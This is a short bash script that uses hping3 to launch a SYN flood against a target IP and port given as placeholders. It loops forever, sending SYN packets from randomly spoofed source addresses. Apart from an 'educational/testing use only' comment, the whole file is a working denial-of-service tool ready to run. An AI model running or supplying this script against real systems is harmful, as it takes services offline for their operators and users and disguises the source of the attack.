#!/bin/bash

# SYN Flood Script using hping3
# ⚠️ Educational/Testing Use Only!

TARGET_IP="IP"  # Change this
TARGET_PORT=80             # Change this

echo "[*] Starting SYN flood on $TARGET_IP:$TARGET_PORT..."
sleep 2

# Infinite loop to send SYN packets with spoofed IPs
while true; do
    SPOOFED_IP="$(shuf -i 1-254 -n 4 | paste -sd.)"
    hping3 -S -p $TARGET_PORT -a $SPOOFED_IP $TARGET_IP -c 1 --rand-source > /dev/null 2>&1
    echo "[+] Sent SYN from $SPOOFED_IP"
    sleep 0.01
done
